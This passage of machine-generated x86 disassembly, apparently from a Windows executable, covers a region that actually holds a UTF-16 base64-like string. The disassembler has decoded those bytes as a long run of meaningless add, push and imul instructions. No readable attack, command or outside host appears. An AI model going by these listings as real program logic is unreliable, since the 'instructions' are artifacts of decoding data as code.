  40a9b9:	00 2b                	add    %ch,(%ebx)
  40a9bb:	00 4e 00             	add    %cl,0x0(%esi)
  40a9be:	70 00                	jo     0x40a9c0
  40a9c0:	2b 00                	sub    (%eax),%eax
  40a9c2:	59                   	pop    %ecx
  40a9c3:	00 66 00             	add    %ah,0x0(%esi)
  40a9c6:	46                   	inc    %esi
  40a9c7:	00 32                	add    %dh,(%edx)
  40a9c9:	00 56 00             	add    %dl,0x0(%esi)
  40a9cc:	62 00                	bound  %eax,(%eax)
  40a9ce:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a9d1:	00 56 00             	add    %dl,0x0(%esi)
  40a9d4:	37                   	aaa
  40a9d5:	00 39                	add    %bh,(%ecx)
  40a9d7:	00 52 00             	add    %dl,0x0(%edx)
  40a9da:	68 00 42 00 6c       	push   $0x6c004200
  40a9df:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9e3:	00 76 00             	add    %dh,0x0(%esi)
  40a9e6:	44                   	inc    %esp
  40a9e7:	00 43 00             	add    %al,0x0(%ebx)
  40a9ea:	42                   	inc    %edx
  40a9eb:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40a9ef:	00 31                	add    %dh,(%ecx)
  40a9f1:	00 43 00             	add    %al,0x0(%ebx)
  40a9f4:	75 00                	jne    0x40a9f6
  40a9f6:	30 00                	xor    %al,(%eax)
  40a9f8:	61                   	popa
  40a9f9:	00 65 00             	add    %ah,0x0(%ebp)
  40a9fc:	56                   	push   %esi
  40a9fd:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa00:	53                   	push   %ebx
  40aa01:	00 52 00             	add    %dl,0x0(%edx)
  40aa04:	53                   	push   %ebx
  40aa05:	00 39                	add    %bh,(%ecx)
  40aa07:	00 2f                	add    %ch,(%edi)
  40aa09:	00 6e 00             	add    %ch,0x0(%esi)
  40aa0c:	65 00 44 00 6b       	add    %al,%gs:0x6b(%eax,%eax,1)
  40aa11:	00 56 00             	add    %dl,0x0(%esi)
  40aa14:	66 00 33             	data16 add %dh,(%ebx)
  40aa17:	00 53 00             	add    %dl,0x0(%ebx)
  40aa1a:	62 00                	bound  %eax,(%eax)
  40aa1c:	53                   	push   %ebx
  40aa1d:	00 50 00             	add    %dl,0x0(%eax)
  40aa20:	42                   	inc    %edx
  40aa21:	00 36                	add    %dh,(%esi)
  40aa23:	00 32                	add    %dh,(%edx)
  40aa25:	00 6e 00             	add    %ch,0x0(%esi)
  40aa28:	53                   	push   %ebx
  40aa29:	00 78 00             	add    %bh,0x0(%eax)
  40aa2c:	57                   	push   %edi
  40aa2d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa30:	6c                   	insb   (%dx),%es:(%edi)
  40aa31:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa34:	32 00                	xor    (%eax),%al
  40aa36:	70 00                	jo     0x40aa38
  40aa38:	5a                   	pop    %edx
  40aa39:	00 73 00             	add    %dh,0x0(%ebx)
  40aa3c:	71 00                	jno    0x40aa3e
  40aa3e:	54                   	push   %esp
  40aa3f:	00 6a 00             	add    %ch,0x0(%edx)
  40aa42:	4c                   	dec    %esp
  40aa43:	00 75 00             	add    %dh,0x0(%ebp)
  40aa46:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40aa4a:	79 00                	jns    0x40aa4c
  40aa4c:	41                   	inc    %ecx
  40aa4d:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40aa51:	00 76 00             	add    %dh,0x0(%esi)
  40aa54:	6d                   	insl   (%dx),%es:(%edi)
  40aa55:	00 63 00             	add    %ah,0x0(%ebx)
  40aa58:	49                   	dec    %ecx
  40aa59:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40aa5d:	00 56 00             	add    %dl,0x0(%esi)
  40aa60:	41                   	inc    %ecx
  40aa61:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40aa65:	00 71 00             	add    %dh,0x0(%ecx)
  40aa68:	4d                   	dec    %ebp
  40aa69:	00 56 00             	add    %dl,0x0(%esi)
  40aa6c:	43                   	inc    %ebx
  40aa6d:	00 79 00             	add    %bh,0x0(%ecx)
  40aa70:	38 00                	cmp    %al,(%eax)
  40aa72:	75 00                	jne    0x40aa74
  40aa74:	50                   	push   %eax
  40aa75:	00 59 00             	add    %bl,0x0(%ecx)
  40aa78:	77 00                	ja     0x40aa7a
  40aa7a:	68 00 2f 00 63       	push   $0x63002f00
  40aa7f:	00 72 00             	add    %dh,0x0(%edx)
  40aa82:	4f                   	dec    %edi
  40aa83:	00 53 00             	add    %dl,0x0(%ebx)
  40aa86:	6b 00 67             	imul   $0x67,(%eax),%eax
  40aa89:	00 35 00 7a 00 50    	add    %dh,0x50007a00
  40aa8f:	00 63 00             	add    %ah,0x0(%ebx)
  40aa92:	59                   	pop    %ecx
  40aa93:	00 58 00             	add    %bl,0x0(%eax)
  40aa96:	4f                   	dec    %edi
  40aa97:	00 75 00             	add    %dh,0x0(%ebp)
  40aa9a:	44                   	inc    %esp
  40aa9b:	00 4f 00             	add    %cl,0x0(%edi)
  40aa9e:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40aaa2:	77 00                	ja     0x40aaa4
  40aaa4:	52                   	push   %edx
  40aaa5:	00 63 00             	add    %ah,0x0(%ebx)
  40aaa8:	78 00                	js     0x40aaaa
  40aaaa:	47                   	inc    %edi
  40aaab:	00 43 00             	add    %al,0x0(%ebx)
  40aaae:	62 00                	bound  %eax,(%eax)
  40aab0:	42                   	inc    %edx
  40aab1:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40aab5:	00 32                	add    %dh,(%edx)
  40aab7:	00 76 00             	add    %dh,0x0(%esi)
  40aaba:	39 00                	cmp    %eax,(%eax)
  40aabc:	42                   	inc    %edx
  40aabd:	00 2f                	add    %ch,(%edi)
  40aabf:	00 6f 00             	add    %ch,0x0(%edi)
  40aac2:	6c                   	insb   (%dx),%es:(%edi)
  40aac3:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40aac7:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaca:	6b 00 48             	imul   $0x48,(%eax),%eax
  40aacd:	00 56 00             	add    %dl,0x0(%esi)
  40aad0:	75 00                	jne    0x40aad2
  40aad2:	32 00                	xor    (%eax),%al
  40aad4:	6b 00 75             	imul   $0x75,(%eax),%eax
  40aad7:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40aadb:	00 58 00             	add    %bl,0x0(%eax)
  40aade:	4b                   	dec    %ebx
  40aadf:	00 75 00             	add    %dh,0x0(%ebp)
  40aae2:	31 00                	xor    %eax,(%eax)
  40aae4:	63 00                	arpl   %eax,(%eax)
  40aae6:	49                   	dec    %ecx
  40aae7:	00 7a 00             	add    %bh,0x0(%edx)
  40aaea:	4f                   	dec    %edi
  40aaeb:	00 4f 00             	add    %cl,0x0(%edi)
  40aaee:	49                   	dec    %ecx
  40aaef:	00 4a 00             	add    %cl,0x0(%edx)
  40aaf2:	49                   	dec    %ecx
  40aaf3:	00 43 00             	add    %al,0x0(%ebx)
  40aaf6:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaf7:	00 31                	add    %dh,(%ecx)
  40aaf9:	00 75 00             	add    %dh,0x0(%ebp)
  40aafc:	71 00                	jno    0x40aafe
  40aafe:	48                   	dec    %eax
  40aaff:	00 31                	add    %dh,(%ecx)
  40ab01:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab04:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40ab08:	48                   	dec    %eax
  40ab09:	00 63 00             	add    %ah,0x0(%ebx)
  40ab0c:	72 00                	jb     0x40ab0e
  40ab0e:	77 00                	ja     0x40ab10
  40ab10:	49                   	dec    %ecx
  40ab11:	00 77 00             	add    %dh,0x0(%edi)
  40ab14:	69 00 4a 00 4a 00    	imul   $0x4a004a,(%eax),%eax
  40ab1a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab1b:	00 68 00             	add    %ch,0x0(%eax)
  40ab1e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab1f:	00 69 00             	add    %ch,0x0(%ecx)
  40ab22:	41                   	inc    %ecx
  40ab23:	00 47 00             	add    %al,0x0(%edi)
  40ab26:	62 00                	bound  %eax,(%eax)
  40ab28:	65 00 4c 00 39       	add    %cl,%gs:0x39(%eax,%eax,1)
  40ab2d:	00 58 00             	add    %bl,0x0(%eax)
  40ab30:	43                   	inc    %ebx
  40ab31:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab34:	73 00                	jae    0x40ab36
  40ab36:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40ab3a:	73 00                	jae    0x40ab3c
  40ab3c:	77 00                	ja     0x40ab3e
  40ab3e:	61                   	popa
  40ab3f:	00 69 00             	add    %ch,0x0(%ecx)
  40ab42:	59                   	pop    %ecx
  40ab43:	00 36                	add    %dh,(%esi)
  40ab45:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab48:	62 00                	bound  %eax,(%eax)
  40ab4a:	2f                   	das
  40ab4b:	00 31                	add    %dh,(%ecx)
  40ab4d:	00 39                	add    %bh,(%ecx)
  40ab4f:	00 55 00             	add    %dl,0x0(%ebp)
  40ab52:	62 00                	bound  %eax,(%eax)
  40ab54:	42                   	inc    %edx
  40ab55:	00 68 00             	add    %ch,0x0(%eax)
  40ab58:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab59:	00 31                	add    %dh,(%ecx)
  40ab5b:	00 49 00             	add    %cl,0x0(%ecx)
  40ab5e:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40ab62:	33 00                	xor    (%eax),%eax
  40ab64:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab65:	00 69 00             	add    %ch,0x0(%ecx)
  40ab68:	32 00                	xor    (%eax),%al
  40ab6a:	52                   	push   %edx
  40ab6b:	00 51 00             	add    %dl,0x0(%ecx)
  40ab6e:	49                   	dec    %ecx
  40ab6f:	00 76 00             	add    %dh,0x0(%esi)
  40ab72:	47                   	inc    %edi
  40ab73:	00 45 00             	add    %al,0x0(%ebp)
  40ab76:	44                   	inc    %esp
  40ab77:	00 67 00             	add    %ah,0x0(%edi)
  40ab7a:	55                   	push   %ebp
  40ab7b:	00 55 00             	add    %dl,0x0(%ebp)
  40ab7e:	57                   	push   %edi
  40ab7f:	00 46 00             	add    %al,0x0(%esi)
  40ab82:	52                   	push   %edx
  40ab83:	00 6a 00             	add    %ch,0x0(%edx)
  40ab86:	6c                   	insb   (%dx),%es:(%edi)
  40ab87:	00 4f 00             	add    %cl,0x0(%edi)
  40ab8a:	58                   	pop    %eax
  40ab8b:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab8e:	70 00                	jo     0x40ab90
  40ab90:	7a 00                	jp     0x40ab92
  40ab92:	57                   	push   %edi
  40ab93:	00 53 00             	add    %dl,0x0(%ebx)
  40ab96:	51                   	push   %ecx
  40ab97:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab9a:	59                   	pop    %ecx
  40ab9b:	00 35 00 6f 00 65    	add    %dh,0x65006f00
  40aba1:	00 45 00             	add    %al,0x0(%ebp)
  40aba4:	49                   	dec    %ecx
  40aba5:	00 43 00             	add    %al,0x0(%ebx)
  40aba8:	55                   	push   %ebp
  40aba9:	00 45 00             	add    %al,0x0(%ebp)
  40abac:	47                   	inc    %edi
  40abad:	00 45 00             	add    %al,0x0(%ebp)
  40abb0:	36 00 4c 00 4d       	add    %cl,%ss:0x4d(%eax,%eax,1)
  40abb5:	00 47 00             	add    %al,0x0(%edi)
  40abb8:	6e                   	outsb  %ds:(%esi),(%dx)
  40abb9:	00 78 00             	add    %bh,0x0(%eax)
  40abbc:	5a                   	pop    %edx
  40abbd:	00 4e 00             	add    %cl,0x0(%esi)
  40abc0:	39 00                	cmp    %eax,(%eax)
  40abc2:	66 00 44 00 48       	data16 add %al,0x48(%eax,%eax,1)
  40abc7:	00 66 00             	add    %ah,0x0(%esi)
  40abca:	4c                   	dec    %esp
  40abcb:	00 65 00             	add    %ah,0x0(%ebp)
  40abce:	49                   	dec    %ecx
  40abcf:	00 78 00             	add    %bh,0x0(%eax)
  40abd2:	51                   	push   %ecx
  40abd3:	00 63 00             	add    %ah,0x0(%ebx)
  40abd6:	77 00                	ja     0x40abd8
  40abd8:	4f                   	dec    %edi
  40abd9:	00 61 00             	add    %ah,0x0(%ecx)
  40abdc:	6a 00                	push   $0x0
  40abde:	6b 00 79             	imul   $0x79,(%eax),%eax
  40abe1:	00 62 00             	add    %ah,0x0(%edx)
  40abe4:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40abe7:	00 4b 00             	add    %cl,0x0(%ebx)
  40abea:	53                   	push   %ebx
  40abeb:	00 6a 00             	add    %ch,0x0(%edx)
  40abee:	77 00                	ja     0x40abf0
  40abf0:	4b                   	dec    %ebx
  40abf1:	00 57 00             	add    %dl,0x0(%edi)
  40abf4:	56                   	push   %esi
  40abf5:	00 6d 00             	add    %ch,0x0(%ebp)
  40abf8:	70 00                	jo     0x40abfa
  40abfa:	37                   	aaa
  40abfb:	00 6b 00             	add    %ch,0x0(%ebx)
  40abfe:	4d                   	dec    %ebp
  40abff:	00 6a 00             	add    %ch,0x0(%edx)
  40ac02:	66 00 47 00          	data16 add %al,0x0(%edi)
  40ac06:	46                   	inc    %esi
  40ac07:	00 53 00             	add    %dl,0x0(%ebx)
  40ac0a:	46                   	inc    %esi
  40ac0b:	00 57 00             	add    %dl,0x0(%edi)
  40ac0e:	72 00                	jb     0x40ac10
  40ac10:	56                   	push   %esi
  40ac11:	00 47 00             	add    %al,0x0(%edi)
  40ac14:	35 00 5a 00 48       	xor    $0x48005a00,%eax
  40ac19:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40ac1d:	00 39                	add    %bh,(%ecx)
  40ac1f:	00 46 00             	add    %al,0x0(%esi)
  40ac22:	70 00                	jo     0x40ac24
  40ac24:	2f                   	das
  40ac25:	00 65 00             	add    %ah,0x0(%ebp)
  40ac28:	43                   	inc    %ebx
  40ac29:	00 4e 00             	add    %cl,0x0(%esi)
  40ac2c:	31 00                	xor    %eax,(%eax)
  40ac2e:	76 00                	jbe    0x40ac30
  40ac30:	6d                   	insl   (%dx),%es:(%edi)
  40ac31:	00 53 00             	add    %dl,0x0(%ebx)
  40ac34:	4e                   	dec    %esi
  40ac35:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac38:	4f                   	dec    %edi
  40ac39:	00 48 00             	add    %cl,0x0(%eax)
  40ac3c:	54                   	push   %esp
  40ac3d:	00 70 00             	add    %dh,0x0(%eax)
  40ac40:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac41:	00 6e 00             	add    %ch,0x0(%esi)
  40ac44:	6b 00 63             	imul   $0x63,(%eax),%eax
  40ac47:	00 43 00             	add    %al,0x0(%ebx)
  40ac4a:	4c                   	dec    %esp
  40ac4b:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40ac4f:	00 5a 00             	add    %bl,0x0(%edx)
  40ac52:	74 00                	je     0x40ac54
  40ac54:	4d                   	dec    %ebp
  40ac55:	00 77 00             	add    %dh,0x0(%edi)
  40ac58:	63 00                	arpl   %eax,(%eax)
  40ac5a:	6b 00 63             	imul   $0x63,(%eax),%eax
  40ac5d:	00 63 00             	add    %ah,0x0(%ebx)
  40ac60:	75 00                	jne    0x40ac62
  40ac62:	4a                   	dec    %edx
  40ac63:	00 55 00             	add    %dl,0x0(%ebp)
  40ac66:	4e                   	dec    %esi
  40ac67:	00 46 00             	add    %al,0x0(%esi)
  40ac6a:	2f                   	das
  40ac6b:	00 58 00             	add    %bl,0x0(%eax)
  40ac6e:	2b 00                	sub    (%eax),%eax
  40ac70:	56                   	push   %esi
  40ac71:	00 71 00             	add    %dh,0x0(%ecx)
  40ac74:	43                   	inc    %ebx
  40ac75:	00 39                	add    %bh,(%ecx)
  40ac77:	00 59 00             	add    %bl,0x0(%ecx)
  40ac7a:	73 00                	jae    0x40ac7c
  40ac7c:	41                   	inc    %ecx
  40ac7d:	00 6e 00             	add    %ch,0x0(%esi)
  40ac80:	6d                   	insl   (%dx),%es:(%edi)
  40ac81:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac84:	69 00 47 00 6f 00    	imul   $0x6f0047,(%eax),%eax
  40ac8a:	2b 00                	sub    (%eax),%eax
  40ac8c:	45                   	inc    %ebp
  40ac8d:	00 68 00             	add    %ch,0x0(%eax)
  40ac90:	2f                   	das
  40ac91:	00 72 00             	add    %dh,0x0(%edx)
  40ac94:	65 00 2b             	add    %ch,%gs:(%ebx)
  40ac97:	00 72 00             	add    %dh,0x0(%edx)
  40ac9a:	46                   	inc    %esi
  40ac9b:	00 76 00             	add    %dh,0x0(%esi)
  40ac9e:	54                   	push   %esp
  40ac9f:	00 50 00             	add    %dl,0x0(%eax)
  40aca2:	51                   	push   %ecx
  40aca3:	00 38                	add    %bh,(%eax)
  40aca5:	00 69 00             	add    %ch,0x0(%ecx)
  40aca8:	31 00                	xor    %eax,(%eax)
  40acaa:	74 00                	je     0x40acac
  40acac:	62 00                	bound  %eax,(%eax)
  40acae:	55                   	push   %ebp
  40acaf:	00 47 00             	add    %al,0x0(%edi)
  40acb2:	68 00 58 00 6e       	push   $0x6e005800
  40acb7:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40acbb:	00 50 00             	add    %dl,0x0(%eax)
  40acbe:	7a 00                	jp     0x40acc0
  40acc0:	56                   	push   %esi
  40acc1:	00 75 00             	add    %dh,0x0(%ebp)
  40acc4:	45                   	inc    %ebp
  40acc5:	00 76 00             	add    %dh,0x0(%esi)
  40acc8:	7a 00                	jp     0x40acca
  40acca:	4c                   	dec    %esp
  40accb:	00 68 00             	add    %ch,0x0(%eax)
  40acce:	32 00                	xor    (%eax),%al
  40acd0:	59                   	pop    %ecx
  40acd1:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40acd5:	00 33                	add    %dh,(%ebx)
  40acd7:	00 41 00             	add    %al,0x0(%ecx)
  40acda:	76 00                	jbe    0x40acdc
  40acdc:	73 00                	jae    0x40acde
  40acde:	6c                   	insb   (%dx),%es:(%edi)
  40acdf:	00 6e 00             	add    %ch,0x0(%esi)
  40ace2:	68 00 59 00 47       	push   $0x47005900
  40ace7:	00 77 00             	add    %dh,0x0(%edi)
  40acea:	74 00                	je     0x40acec
  40acec:	6f                   	outsl  %ds:(%esi),(%dx)
  40aced:	00 41 00             	add    %al,0x0(%ecx)
  40acf0:	73 00                	jae    0x40acf2
  40acf2:	37                   	aaa
  40acf3:	00 32                	add    %dh,(%edx)
  40acf5:	00 39                	add    %bh,(%ecx)
  40acf7:	00 35 00 30 00 62    	add    %dh,0x62003000
  40acfd:	00 56 00             	add    %dl,0x0(%esi)
  40ad00:	79 00                	jns    0x40ad02
  40ad02:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40ad06:	2b 00                	sub    (%eax),%eax
  40ad08:	49                   	dec    %ecx
  40ad09:	00 67 00             	add    %ah,0x0(%edi)
  40ad0c:	56                   	push   %esi
  40ad0d:	00 38                	add    %bh,(%eax)
  40ad0f:	00 39                	add    %bh,(%ecx)
  40ad11:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad14:	51                   	push   %ecx
  40ad15:	00 45 00             	add    %al,0x0(%ebp)
  40ad18:	38 00                	cmp    %al,(%eax)
  40ad1a:	51                   	push   %ecx
  40ad1b:	00 57 00             	add    %dl,0x0(%edi)
  40ad1e:	63 00                	arpl   %eax,(%eax)
  40ad20:	71 00                	jno    0x40ad22
  40ad22:	33 00                	xor    (%eax),%eax
  40ad24:	35 00 4c 00 6e       	xor    $0x6e004c00,%eax
  40ad29:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40ad2d:	00 36                	add    %dh,(%esi)
  40ad2f:	00 4e 00             	add    %cl,0x0(%esi)
  40ad32:	4e                   	dec    %esi
  40ad33:	00 77 00             	add    %dh,0x0(%edi)
  40ad36:	45                   	inc    %ebp
  40ad37:	00 72 00             	add    %dh,0x0(%edx)
  40ad3a:	2f                   	das
  40ad3b:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40ad3f:	00 5a 00             	add    %bl,0x0(%edx)
  40ad42:	6a 00                	push   $0x0
  40ad44:	45                   	inc    %ebp
  40ad45:	00 45 00             	add    %al,0x0(%ebp)
  40ad48:	59                   	pop    %ecx
  40ad49:	00 53 00             	add    %dl,0x0(%ebx)
  40ad4c:	75 00                	jne    0x40ad4e
  40ad4e:	67 00 4d 00          	add    %cl,0x0(%di)
  40ad52:	65 00 6c 00 4d       	add    %ch,%gs:0x4d(%eax,%eax,1)
  40ad57:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad5a:	39 00                	cmp    %eax,(%eax)
  40ad5c:	31 00                	xor    %eax,(%eax)
  40ad5e:	4a                   	dec    %edx
  40ad5f:	00 43 00             	add    %al,0x0(%ebx)
  40ad62:	6d                   	insl   (%dx),%es:(%edi)
  40ad63:	00 69 00             	add    %ch,0x0(%ecx)
  40ad66:	50                   	push   %eax
  40ad67:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad6a:	53                   	push   %ebx
  40ad6b:	00 48 00             	add    %cl,0x0(%eax)
  40ad6e:	45                   	inc    %ebp
  40ad6f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad72:	68 00 45 00 70       	push   $0x70004500
  40ad77:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40ad7b:	00 48 00             	add    %cl,0x0(%eax)
  40ad7e:	76 00                	jbe    0x40ad80
  40ad80:	54                   	push   %esp
  40ad81:	00 30                	add    %dh,(%eax)
  40ad83:	00 46 00             	add    %al,0x0(%esi)
  40ad86:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40ad8a:	66 00 35 00 4a 00 75 	data16 add %dh,0x75004a00
  40ad91:	00 7a 00             	add    %bh,0x0(%edx)
  40ad94:	70 00                	jo     0x40ad96
  40ad96:	7a 00                	jp     0x40ad98
  40ad98:	4b                   	dec    %ebx
  40ad99:	00 65 00             	add    %ah,0x0(%ebp)
  40ad9c:	75 00                	jne    0x40ad9e
  40ad9e:	5a                   	pop    %edx
  40ad9f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ada2:	45                   	inc    %ebp
  40ada3:	00 38                	add    %bh,(%eax)
  40ada5:	00 76 00             	add    %dh,0x0(%esi)
  40ada8:	7a 00                	jp     0x40adaa
  40adaa:	48                   	dec    %eax
  40adab:	00 66 00             	add    %ah,0x0(%esi)
  40adae:	45                   	inc    %ebp
  40adaf:	00 4a 00             	add    %cl,0x0(%edx)
  40adb2:	31 00                	xor    %eax,(%eax)
  40adb4:	31 00                	xor    %eax,(%eax)
  40adb6:	39 00                	cmp    %eax,(%eax)
  40adb8:	44                   	inc    %esp
  40adb9:	00 4d 00             	add    %cl,0x0(%ebp)
  40adbc:	50                   	push   %eax
  40adbd:	00 56 00             	add    %dl,0x0(%esi)
  40adc0:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40adc3:	00 42 00             	add    %al,0x0(%edx)
  40adc6:	44                   	inc    %esp
  40adc7:	00 62 00             	add    %ah,0x0(%edx)
  40adca:	34 00                	xor    $0x0,%al
  40adcc:	75 00                	jne    0x40adce
  40adce:	57                   	push   %edi
  40adcf:	00 6f 00             	add    %ch,0x0(%edi)
  40add2:	52                   	push   %edx
  40add3:	00 39                	add    %bh,(%ecx)
  40add5:	00 35 00 4b 00 32    	add    %dh,0x32004b00
  40addb:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40addf:	00 7a 00             	add    %bh,0x0(%edx)
  40ade2:	78 00                	js     0x40ade4
  40ade4:	52                   	push   %edx
  40ade5:	00 41 00             	add    %al,0x0(%ecx)
  40ade8:	78 00                	js     0x40adea
  40adea:	51                   	push   %ecx
  40adeb:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40adef:	00 76 00             	add    %dh,0x0(%esi)
  40adf2:	58                   	pop    %eax
  40adf3:	00 72 00             	add    %dh,0x0(%edx)
  40adf6:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40adfa:	50                   	push   %eax
  40adfb:	00 6a 00             	add    %ch,0x0(%edx)
  40adfe:	74 00                	je     0x40ae00
  40ae00:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40ae04:	50                   	push   %eax
  40ae05:	00 51 00             	add    %dl,0x0(%ecx)
  40ae08:	6c                   	insb   (%dx),%es:(%edi)
  40ae09:	00 57 00             	add    %dl,0x0(%edi)
  40ae0c:	76 00                	jbe    0x40ae0e
  40ae0e:	2f                   	das
  40ae0f:	00 72 00             	add    %dh,0x0(%edx)
  40ae12:	43                   	inc    %ebx
  40ae13:	00 78 00             	add    %bh,0x0(%eax)
  40ae16:	32 00                	xor    (%eax),%al
  40ae18:	52                   	push   %edx
  40ae19:	00 32                	add    %dh,(%edx)
  40ae1b:	00 78 00             	add    %bh,0x0(%eax)
  40ae1e:	4a                   	dec    %edx
  40ae1f:	00 71 00             	add    %dh,0x0(%ecx)
  40ae22:	44                   	inc    %esp
  40ae23:	00 55 00             	add    %dl,0x0(%ebp)
  40ae26:	72 00                	jb     0x40ae28
  40ae28:	70 00                	jo     0x40ae2a
  40ae2a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40ae2d:	00 4f 00             	add    %cl,0x0(%edi)
  40ae30:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40ae34:	79 00                	jns    0x40ae36
  40ae36:	78 00                	js     0x40ae38
  40ae38:	4b                   	dec    %ebx
  40ae39:	00 75 00             	add    %dh,0x0(%ebp)
  40ae3c:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40ae40:	62 00                	bound  %eax,(%eax)
  40ae42:	70 00                	jo     0x40ae44
  40ae44:	69 00 61 00 33 00    	imul   $0x330061,(%eax),%eax
  40ae4a:	6c                   	insb   (%dx),%es:(%edi)
  40ae4b:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40ae4f:	00 61 00             	add    %ah,0x0(%ecx)
  40ae52:	77 00                	ja     0x40ae54
  40ae54:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40ae58:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae59:	00 31                	add    %dh,(%ecx)
  40ae5b:	00 32                	add    %dh,(%edx)
  40ae5d:	00 41 00             	add    %al,0x0(%ecx)
  40ae60:	66 00 74 00 37       	data16 add %dh,0x37(%eax,%eax,1)
  40ae65:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae68:	62 00                	bound  %eax,(%eax)
  40ae6a:	45                   	inc    %ebp
  40ae6b:	00 62 00             	add    %ah,0x0(%edx)
  40ae6e:	43                   	inc    %ebx
  40ae6f:	00 4a 00             	add    %cl,0x0(%edx)
  40ae72:	56                   	push   %esi
  40ae73:	00 56 00             	add    %dl,0x0(%esi)
  40ae76:	6c                   	insb   (%dx),%es:(%edi)
  40ae77:	00 52 00             	add    %dl,0x0(%edx)
  40ae7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae7b:	00 76 00             	add    %dh,0x0(%esi)
  40ae7e:	31 00                	xor    %eax,(%eax)
  40ae80:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae81:	00 49 00             	add    %cl,0x0(%ecx)
  40ae84:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40ae88:	79 00                	jns    0x40ae8a
  40ae8a:	4e                   	dec    %esi
  40ae8b:	00 31                	add    %dh,(%ecx)
  40ae8d:	00 2f                	add    %ch,(%edi)
  40ae8f:	00 58 00             	add    %bl,0x0(%eax)
  40ae92:	30 00                	xor    %al,(%eax)
  40ae94:	66 00 47 00          	data16 add %al,0x0(%edi)
  40ae98:	4b                   	dec    %ebx
  40ae99:	00 53 00             	add    %dl,0x0(%ebx)
  40ae9c:	66 00 32             	data16 add %dh,(%edx)
  40ae9f:	00 73 00             	add    %dh,0x0(%ebx)
  40aea2:	76 00                	jbe    0x40aea4
  40aea4:	37                   	aaa
  40aea5:	00 76 00             	add    %dh,0x0(%esi)
  40aea8:	55                   	push   %ebp
  40aea9:	00 6f 00             	add    %ch,0x0(%edi)
  40aeac:	5a                   	pop    %edx
  40aead:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40aeb1:	00 48 00             	add    %cl,0x0(%eax)
  40aeb4:	77 00                	ja     0x40aeb6
  40aeb6:	4b                   	dec    %ebx
  40aeb7:	00 5a 00             	add    %bl,0x0(%edx)
  40aeba:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40aebe:	48                   	dec    %eax
  40aebf:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40aec3:	00 77 00             	add    %dh,0x0(%edi)
  40aec6:	4b                   	dec    %ebx
  40aec7:	00 71 00             	add    %dh,0x0(%ecx)
  40aeca:	53                   	push   %ebx
  40aecb:	00 71 00             	add    %dh,0x0(%ecx)
  40aece:	70 00                	jo     0x40aed0
  40aed0:	48                   	dec    %eax
  40aed1:	00 6e 00             	add    %ch,0x0(%esi)
  40aed4:	51                   	push   %ecx
  40aed5:	00 66 00             	add    %ah,0x0(%esi)
  40aed8:	31 00                	xor    %eax,(%eax)
  40aeda:	43                   	inc    %ebx
  40aedb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aede:	5a                   	pop    %edx
  40aedf:	00 36                	add    %dh,(%esi)
  40aee1:	00 71 00             	add    %dh,0x0(%ecx)
  40aee4:	61                   	popa
  40aee5:	00 31                	add    %dh,(%ecx)
  40aee7:	00 56 00             	add    %dl,0x0(%esi)
  40aeea:	4b                   	dec    %ebx
